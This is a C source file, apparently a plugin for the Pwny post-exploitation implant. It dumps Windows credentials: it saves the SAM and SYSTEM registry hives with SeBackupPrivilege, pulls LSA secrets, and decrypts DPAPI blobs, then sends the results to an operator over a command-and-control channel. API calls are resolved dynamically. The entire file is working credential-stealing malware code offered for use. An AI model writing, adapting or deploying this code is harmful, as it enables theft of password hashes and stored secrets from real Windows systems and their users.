/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Credentials COT plugin — SAM hashdump + LSA secrets + DPAPI.
 * Merged from hashdump + lsa_secrets.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <ntsecapi.h>
#include <dpapi.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Tags                                                                */
/* ------------------------------------------------------------------ */

#define CRED_HASHDUMP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL)

#define CRED_LSA_SECRETS \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 1)

#define CRED_DPAPI_DECRYPT \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 2)

/* TLV types — hashdump */
#define TLV_TYPE_HASH_SAM    TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, TAB_BASE, API_TYPE)
#define TLV_TYPE_HASH_SYSTEM TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, TAB_BASE, API_TYPE + 1)

/* TLV types — lsa_secrets (separate responses, can reuse base offsets) */
#define LSA_SECRETS_TYPE_NAME   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define LSA_SECRETS_TYPE_DATA   TLV_TYPE_CUSTOM(TLV_TYPE_BYTES,  TAB_BASE, API_TYPE)
#define LSA_DPAPI_TYPE_INPUT    TLV_TYPE_CUSTOM(TLV_TYPE_BYTES,  TAB_BASE, API_TYPE + 1)
#define LSA_DPAPI_TYPE_OUTPUT   TLV_TYPE_CUSTOM(TLV_TYPE_BYTES,  TAB_BASE, API_TYPE + 2)
#define LSA_DPAPI_TYPE_ENTROPY  TLV_TYPE_CUSTOM(TLV_TYPE_BYTES,  TAB_BASE, API_TYPE + 3)

/* ------------------------------------------------------------------ */
/* Win32 function pointer types                                        */
/* ------------------------------------------------------------------ */

/* Hashdump — privilege / registry / file */
typedef BOOL    (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef HANDLE  (WINAPI *fn_GetCurrentProcess)(void);
typedef BOOL    (WINAPI *fn_LookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
typedef BOOL    (WINAPI *fn_AdjustTokenPrivileges)(HANDLE, BOOL,
                                                    PTOKEN_PRIVILEGES, DWORD,
                                                    PTOKEN_PRIVILEGES, PDWORD);
typedef BOOL    (WINAPI *fn_CloseHandle)(HANDLE);
typedef LSTATUS (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LSTATUS (WINAPI *fn_RegSaveKeyA)(HKEY, LPCSTR, LPSECURITY_ATTRIBUTES);
typedef HANDLE  (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD,
                                         LPSECURITY_ATTRIBUTES, DWORD,
                                         DWORD, HANDLE);
typedef DWORD   (WINAPI *fn_GetFileSize)(HANDLE, LPDWORD);
typedef BOOL    (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL    (WINAPI *fn_DeleteFileA)(LPCSTR);
typedef DWORD   (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
typedef int     (__cdecl *fn__snprintf)(char *, size_t, const char *, ...);

/* LSA — policy / registry / dpapi */
typedef int     (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWCH, int,
                                                 LPSTR, int, LPCCH, LPBOOL);
typedef NTSTATUS (WINAPI *fn_LsaOpenPolicy)(PLSA_UNICODE_STRING,
                                            PLSA_OBJECT_ATTRIBUTES,
                                            ACCESS_MASK, PLSA_HANDLE);
typedef NTSTATUS (WINAPI *fn_LsaRetrievePrivateData)(LSA_HANDLE,
                                                     PLSA_UNICODE_STRING,
                                                     PLSA_UNICODE_STRING *);
typedef NTSTATUS (WINAPI *fn_LsaClose)(LSA_HANDLE);
typedef NTSTATUS (WINAPI *fn_LsaFreeMemory)(PVOID);
typedef LSTATUS  (WINAPI *fn_RegOpenKeyExW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
typedef LSTATUS  (WINAPI *fn_RegEnumKeyExW)(HKEY, DWORD, LPWSTR, LPDWORD,
                                            LPDWORD, LPWSTR, LPDWORD,
                                            PFILETIME);
typedef BOOL    (WINAPI *fn_CryptUnprotectData)(DATA_BLOB *, LPWSTR *,
                                                DATA_BLOB *, PVOID,
                                                CRYPTPROTECT_PROMPTSTRUCT *,
                                                DWORD, DATA_BLOB *);
typedef HLOCAL  (WINAPI *fn_LocalFree)(HLOCAL);

/* Shared */
typedef DWORD   (WINAPI *fn_GetLastError)(void);
typedef LSTATUS (WINAPI *fn_RegCloseKey)(HKEY);

static struct
{
    /* Hashdump */
    fn_OpenProcessToken       pOpenProcessToken;
    fn_GetCurrentProcess      pGetCurrentProcess;
    fn_LookupPrivilegeValueA  pLookupPrivilegeValueA;
    fn_AdjustTokenPrivileges  pAdjustTokenPrivileges;
    fn_CloseHandle            pCloseHandle;
    fn_RegOpenKeyExA          pRegOpenKeyExA;
    fn_RegSaveKeyA            pRegSaveKeyA;
    fn_CreateFileA            pCreateFileA;
    fn_GetFileSize            pGetFileSize;
    fn_ReadFile               pReadFile;
    fn_DeleteFileA            pDeleteFileA;
    fn_GetTempPathA           pGetTempPathA;
    fn__snprintf              p_snprintf;

    /* LSA */
    fn_WideCharToMultiByte    pWideCharToMultiByte;
    fn_LsaOpenPolicy          pLsaOpenPolicy;
    fn_LsaRetrievePrivateData pLsaRetrievePrivateData;
    fn_LsaClose               pLsaClose;
    fn_LsaFreeMemory          pLsaFreeMemory;
    fn_RegOpenKeyExW          pRegOpenKeyExW;
    fn_RegEnumKeyExW          pRegEnumKeyExW;
    fn_CryptUnprotectData     pCryptUnprotectData;
    fn_LocalFree              pLocalFree;

    /* Shared */
    fn_GetLastError           pGetLastError;
    fn_RegCloseKey            pRegCloseKey;
} w;

/* ================================================================== */
/* Hashdump                                                            */
/* ================================================================== */

static int hashdump_enable_privilege(LPCSTR priv)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!w.pOpenProcessToken(w.pGetCurrentProcess(),
                             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return -1;

    if (!w.pLookupPrivilegeValueA(NULL, priv, &luid))
    {
        w.pCloseHandle(hToken);
        return -1;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!w.pAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
    {
        w.pCloseHandle(hToken);
        return -1;
    }

    w.pCloseHandle(hToken);
    return (w.pGetLastError() == ERROR_NOT_ALL_ASSIGNED) ? -1 : 0;
}

static int hashdump_save_hive(HKEY hive, const char *path)
{
    LONG ret;

    w.pDeleteFileA(path);

    ret = w.pRegSaveKeyA(hive, path, NULL);
    if (ret != ERROR_SUCCESS)
    {
        log_debug("* RegSaveKey failed (%ld)\n", ret);
        return -1;
    }

    return 0;
}

static int hashdump_read_file(const char *path, unsigned char **buf, DWORD *size)
{
    HANDLE hFile;
    DWORD file_size;
    DWORD bytes_read;

    hFile = w.pCreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return -1;

    file_size = w.pGetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size == 0)
    {
        w.pCloseHandle(hFile);
        return -1;
    }

    *buf = (unsigned char *)malloc(file_size);
    if (*buf == NULL)
    {
        w.pCloseHandle(hFile);
        return -1;
    }

    if (!w.pReadFile(hFile, *buf, file_size, &bytes_read, NULL) ||
        bytes_read != file_size)
    {
        free(*buf);
        *buf = NULL;
        w.pCloseHandle(hFile);
        return -1;
    }

    *size = file_size;
    w.pCloseHandle(hFile);
    return 0;
}

static tlv_pkt_t *cred_hashdump(c2_t *c2)
{
    tlv_pkt_t *result;
    HKEY hSAM, hSYSTEM;
    char sam_path[MAX_PATH];
    char sys_path[MAX_PATH];
    unsigned char *sam_data = NULL;
    unsigned char *sys_data = NULL;
    DWORD sam_size, sys_size;
    char temp_dir[MAX_PATH];

    hashdump_enable_privilege("SeBackupPrivilege");

    if (w.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0,
                         KEY_READ, &hSAM) != ERROR_SUCCESS)
    {
        log_debug("* Failed to open SAM hive\n");
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (w.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM", 0,
                         KEY_READ, &hSYSTEM) != ERROR_SUCCESS)
    {
        w.pRegCloseKey(hSAM);
        log_debug("* Failed to open SYSTEM hive\n");
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pGetTempPathA(MAX_PATH, temp_dir);
    w.p_snprintf(sam_path, MAX_PATH, "%s%s", temp_dir, "pwny_sam.tmp");
    w.p_snprintf(sys_path, MAX_PATH, "%s%s", temp_dir, "pwny_sys.tmp");

    if (hashdump_save_hive(hSAM, sam_path) != 0)
    {
        w.pRegCloseKey(hSAM);
        w.pRegCloseKey(hSYSTEM);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (hashdump_save_hive(hSYSTEM, sys_path) != 0)
    {
        w.pDeleteFileA(sam_path);
        w.pRegCloseKey(hSAM);
        w.pRegCloseKey(hSYSTEM);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pRegCloseKey(hSAM);
    w.pRegCloseKey(hSYSTEM);

    if (hashdump_read_file(sam_path, &sam_data, &sam_size) != 0)
    {
        w.pDeleteFileA(sam_path);
        w.pDeleteFileA(sys_path);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (hashdump_read_file(sys_path, &sys_data, &sys_size) != 0)
    {
        free(sam_data);
        w.pDeleteFileA(sam_path);
        w.pDeleteFileA(sys_path);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_bytes(result, TLV_TYPE_HASH_SAM, sam_data, sam_size);
    tlv_pkt_add_bytes(result, TLV_TYPE_HASH_SYSTEM, sys_data, sys_size);

    free(sam_data);
    free(sys_data);
    w.pDeleteFileA(sam_path);
    w.pDeleteFileA(sys_path);

    return result;
}

/* ================================================================== */
/* LSA secrets                                                         */
/* ================================================================== */

static tlv_pkt_t *cred_lsa_secrets(c2_t *c2)
{
    LSA_OBJECT_ATTRIBUTES oa;
    LSA_HANDLE hPolicy = NULL;
    NTSTATUS status;

    HKEY hSecrets = NULL;
    DWORD idx;
    DWORD nameLen;
    wchar_t nameBuf[256];

    tlv_pkt_t *result;

    memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);

    status = w.pLsaOpenPolicy(NULL, &oa,
                               POLICY_GET_PRIVATE_INFORMATION,
                               &hPolicy);

    if (status != 0)
    {
        log_debug("* lsa_secrets: LsaOpenPolicy failed (0x%lx)\n",
                  (unsigned long)status);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (w.pRegOpenKeyExW(HKEY_LOCAL_MACHINE,
                         L"SECURITY\\Policy\\Secrets",
                         0, KEY_ENUMERATE_SUB_KEYS,
                         &hSecrets) != ERROR_SUCCESS)
    {
        log_debug("* lsa_secrets: cannot open Secrets registry key\n");
        w.pLsaClose(hPolicy);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (idx = 0; ; idx++)
    {
        LSA_UNICODE_STRING keyName;
        PLSA_UNICODE_STRING privateData = NULL;
        tlv_pkt_t *entry;
        char name_utf8[512];
        int len;

        nameLen = 256;
        if (w.pRegEnumKeyExW(hSecrets, idx, nameBuf,
                             &nameLen, NULL, NULL, NULL,
                             NULL) != ERROR_SUCCESS)
            break;

        keyName.Buffer = nameBuf;
        keyName.Length = (USHORT)(nameLen * sizeof(wchar_t));
        keyName.MaximumLength = (USHORT)((nameLen + 1) * sizeof(wchar_t));

        status = w.pLsaRetrievePrivateData(hPolicy, &keyName, &privateData);

        entry = tlv_pkt_create();

        len = w.pWideCharToMultiByte(CP_UTF8, 0, nameBuf, nameLen,
                                    name_utf8, sizeof(name_utf8) - 1,
                                    NULL, NULL);
        if (len > 0)
            name_utf8[len] = '\0';
        else
            name_utf8[0] = '\0';

        tlv_pkt_add_string(entry, LSA_SECRETS_TYPE_NAME, name_utf8);

        if (status == 0 && privateData != NULL &&
            privateData->Buffer != NULL && privateData->Length > 0)
        {
            tlv_pkt_add_bytes(entry, LSA_SECRETS_TYPE_DATA,
                              (unsigned char *)privateData->Buffer,
                              privateData->Length);
        }
        else
        {
            tlv_pkt_add_bytes(entry, LSA_SECRETS_TYPE_DATA,
                              (unsigned char *)"", 0);
        }

        if (privateData != NULL)
            w.pLsaFreeMemory(privateData);

        tlv_pkt_add_tlv(result, TLV_TYPE_GROUP, entry);
        tlv_pkt_destroy(entry);
    }

    w.pRegCloseKey(hSecrets);
    w.pLsaClose(hPolicy);

    return result;
}

/* ================================================================== */
/* DPAPI                                                               */
/* ================================================================== */

static tlv_pkt_t *cred_dpapi_decrypt(c2_t *c2)
{
    unsigned char *input_buf = NULL;
    int input_len;

    unsigned char *entropy_buf = NULL;
    int entropy_len;

    DATA_BLOB dataIn;
    DATA_BLOB dataOut;
    DATA_BLOB optEntropy;
    DATA_BLOB *pEntropy = NULL;

    tlv_pkt_t *result;

    input_len = tlv_pkt_get_bytes(c2->request, LSA_DPAPI_TYPE_INPUT,
                                  &input_buf);
    if (input_len <= 0 || input_buf == NULL)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    dataIn.pbData = input_buf;
    dataIn.cbData = (DWORD)input_len;

    memset(&dataOut, 0, sizeof(dataOut));

    entropy_len = tlv_pkt_get_bytes(c2->request, LSA_DPAPI_TYPE_ENTROPY,
                                    &entropy_buf);
    if (entropy_len > 0 && entropy_buf != NULL)
    {
        optEntropy.pbData = entropy_buf;
        optEntropy.cbData = (DWORD)entropy_len;
        pEntropy = &optEntropy;
    }

    if (!w.pCryptUnprotectData(&dataIn, NULL, pEntropy,
                               NULL, NULL,
                               CRYPTPROTECT_UI_FORBIDDEN,
                               &dataOut))
    {
        log_debug("* dpapi: CryptUnprotectData failed (%lu)\n",
                  w.pGetLastError());
        free(input_buf);
        if (entropy_buf)
            free(entropy_buf);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    if (dataOut.pbData != NULL && dataOut.cbData > 0)
    {
        tlv_pkt_add_bytes(result, LSA_DPAPI_TYPE_OUTPUT,
                          dataOut.pbData, dataOut.cbData);
    }

    w.pLocalFree(dataOut.pbData);

    free(input_buf);
    if (entropy_buf)
        free(entropy_buf);

    return result;
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    /* Hashdump — kernel32 */
    w.pGetCurrentProcess     = (fn_GetCurrentProcess)cot_resolve("kernel32.dll",
                                                                  "GetCurrentProcess");
    w.pCloseHandle           = (fn_CloseHandle)cot_resolve("kernel32.dll",
                                                            "CloseHandle");
    w.pCreateFileA           = (fn_CreateFileA)cot_resolve("kernel32.dll",
                                                            "CreateFileA");
    w.pGetFileSize           = (fn_GetFileSize)cot_resolve("kernel32.dll",
                                                            "GetFileSize");
    w.pReadFile              = (fn_ReadFile)cot_resolve("kernel32.dll",
                                                         "ReadFile");
    w.pDeleteFileA           = (fn_DeleteFileA)cot_resolve("kernel32.dll",
                                                            "DeleteFileA");
    w.pGetTempPathA          = (fn_GetTempPathA)cot_resolve("kernel32.dll",
                                                              "GetTempPathA");

    /* Hashdump — advapi32 */
    w.pOpenProcessToken      = (fn_OpenProcessToken)cot_resolve("advapi32.dll",
                                                                 "OpenProcessToken");
    w.pLookupPrivilegeValueA = (fn_LookupPrivilegeValueA)cot_resolve("advapi32.dll",
                                                                      "LookupPrivilegeValueA");
    w.pAdjustTokenPrivileges = (fn_AdjustTokenPrivileges)cot_resolve("advapi32.dll",
                                                                      "AdjustTokenPrivileges");
    w.pRegOpenKeyExA         = (fn_RegOpenKeyExA)cot_resolve("advapi32.dll",
                                                              "RegOpenKeyExA");
    w.pRegSaveKeyA           = (fn_RegSaveKeyA)cot_resolve("advapi32.dll",
                                                             "RegSaveKeyA");

    /* Hashdump — msvcrt */
    w.p_snprintf             = (fn__snprintf)cot_resolve("msvcrt.dll",
                                                          "_snprintf");

    /* LSA — kernel32 */
    w.pWideCharToMultiByte   = (fn_WideCharToMultiByte)cot_resolve("kernel32.dll",
                                                                    "WideCharToMultiByte");
    w.pLocalFree             = (fn_LocalFree)cot_resolve("kernel32.dll",
                                                          "LocalFree");

    /* LSA — advapi32 */
    w.pLsaOpenPolicy          = (fn_LsaOpenPolicy)cot_resolve("advapi32.dll",
                                                               "LsaOpenPolicy");
    w.pLsaRetrievePrivateData = (fn_LsaRetrievePrivateData)cot_resolve("advapi32.dll",
                                                                       "LsaRetrievePrivateData");
    w.pLsaClose               = (fn_LsaClose)cot_resolve("advapi32.dll",
                                                          "LsaClose");
    w.pLsaFreeMemory          = (fn_LsaFreeMemory)cot_resolve("advapi32.dll",
                                                               "LsaFreeMemory");
    w.pRegOpenKeyExW          = (fn_RegOpenKeyExW)cot_resolve("advapi32.dll",
                                                               "RegOpenKeyExW");
    w.pRegEnumKeyExW          = (fn_RegEnumKeyExW)cot_resolve("advapi32.dll",
                                                               "RegEnumKeyExW");

    /* DPAPI — crypt32 */
    w.pCryptUnprotectData     = (fn_CryptUnprotectData)cot_resolve("crypt32.dll",
                                                                    "CryptUnprotectData");

    /* Shared */
    w.pGetLastError           = (fn_GetLastError)cot_resolve("kernel32.dll",
                                                              "GetLastError");
    w.pRegCloseKey            = (fn_RegCloseKey)cot_resolve("advapi32.dll",
                                                             "RegCloseKey");

    /* Register handlers */
    api_call_register(api_calls, CRED_HASHDUMP,      (api_t)cred_hashdump);
    api_call_register(api_calls, CRED_LSA_SECRETS,   (api_t)cred_lsa_secrets);
    api_call_register(api_calls, CRED_DPAPI_DECRYPT, (api_t)cred_dpapi_decrypt);
}

#endif
